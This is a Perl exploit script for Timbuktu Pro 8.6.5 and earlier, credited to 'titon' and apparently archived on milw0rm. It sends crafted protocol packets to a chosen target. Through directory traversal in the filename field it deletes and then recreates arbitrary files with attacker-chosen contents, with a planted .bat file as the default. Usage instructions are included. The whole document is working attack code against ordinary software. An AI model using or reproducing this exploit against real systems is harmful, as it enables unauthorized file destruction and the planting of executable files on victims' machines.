#!/usr/bin/perl
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
# Timbuktu Pro <= 8.6.5 Arbitrary File Deletion/Creation
#
# Bug & Exploit by titon [titon{at}bastardlabs{dot}com]
#
# Advisory: 
# http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=590
#
# Copyright: (c)2007 BastardLabs
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
#
# Usage: $ ./timbuktu_sploit.pl 192.168.0.69 407
#
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
use IO::Socket;
use Time::HiRes qw(usleep);
##
## we start in the C:\Program Files\Timbuktu Pro\N1\ folder
##
$filename = &promptUser("Filename" ,"\\../../../pnw3d.bat");
##$filename = &promptUser("Filename" ,"../../../pnw3d.bat");
$payload = &promptUser("Payload ","echo pwwwnnn333ddd !!");
##
##payload can be either text or binary (in \x42\x69\x42 format)
##
$payload =~ s/\\x(..)/pack("C",hex($1))/egi;
##
## packet1 == â€œhelloâ€ packet
##
$packet1= "\x00\x01\x6b\x00\x00\xb0\x00\x23\x07\x22\x03\x07\xd6\x69\x6d\x3b".
"\x27\xa8\xd0\xf2\xd6\x69\x6d\x3b\x27\xa8\xd0\xf2\x00\x09\x01\x41".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x01\x97\x01\x41\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\xb7\x1d".
"\xbf\x42\x00\x00\x00\x00\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00";
$packet2= "\xff";
##
## packet3 == packet containing the filename (with directory traversal)
##
$packet3= "\xfb\x00\x00\x00\x00\x54\x45\x58\x54\x74\x74\x78\x74\xc2\x32\x94".
"\xcc\xc2\x32\x94\xd9\x00\x00\x00\x00\x00\x00\x00\x13\x00\x00\x00".
"\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00" . pack("C",length($filename)) . $filename ;
$packet4= "\xf9\x00";
##
## packet5 == payload, the size of the payload is over 2 bytes
## so we have 65535 bytes of data to play with
##
$packet5= "\xf8" . pack("n",length($payload)) . $payload ;
$packet6= "\xf7";
$packet7= "\xfa";
$packet8= "\xfe";
##
##DELETE THE FILE (IF NECESSARY)
##
print "[+] Delete the file (if necessary)\n";
print "[+] Connecting...\n";
$remote = &connection("$ARGV[0]","$ARGV[1]");
print "[+] Connected to $ARGV[0]:$ARGV[1]\n";
print $remote $packet1; print "[+] Packet 1 Sent\n"; usleep (80000);
print $remote $packet2; print "[+] Packet 2 Sent\n"; usleep (80000);
print $remote $packet3; print "[+] Packet 3 Sent\n"; usleep (80000);
##
## we break the connection before it's completed (i.e before the \xfe)
##
close $remote;
##
##(RE)CREATE THE FILE
##
print "[+] (Re)Create the file with our content\n";
print "[+] Connecting...\n";
$remote = &connection("$ARGV[0]","$ARGV[1]");
print "[+] Connected to $ARGV[0]:$ARGV[1]\n";
print $remote $packet1; print "[+] Packet 1 Sent\n"; usleep (80000);
print $remote $packet2; print "[+] Packet 2 Sent\n"; usleep (80000);
print $remote $packet3; print "[+] Packet 3 Sent\n"; usleep (80000);
print $remote $packet4; print "[+] Packet 4 Sent\n"; usleep (80000);
print $remote $packet5; print "[+] Packet 5 Sent\n"; usleep (80000);
print $remote $packet6; print "[+] Packet 6 Sent\n"; usleep (80000);
print $remote $packet7; print "[+] Packet 7 Sent\n"; usleep (80000);
print $remote $packet8; print "[+] Packet 8 Sent\n"; usleep (80000);
close $remote;
sub connection
{
local($dest,$port) = @_;
my $remote;
if (!$port or !dest) {
print "\nUsage: $ ./timbuktu_sploit.pl 192.168.0.69 407\n\n"; exit; }
else
{
$remote = IO::Socket::INET->new(
Proto => tcp,
PeerAddr => $dest,
PeerPort => $port,
Timeout => 1) or print "[-] Error: Could not establish a
connection to $dest:$port\n" and exit;
return $remote;
}
}
sub promptUser {
local($promptString,$defaultValue) = @_;
if ($defaultValue) {
print $promptString, "[", $defaultValue, "]: ";
} else {
print $promptString, ": ";
}
$| = 1; # force a flush after our print
$_ = <STDIN>; # get the input from STDIN
chomp;
if ("$defaultValue") {
return $_ ? $_ : $defaultValue; # return $_ if it has a value
} else {
return $_;
}
}

# milw0rm.com [2007-09-25]

# milw0rm.com [2008-03-11]
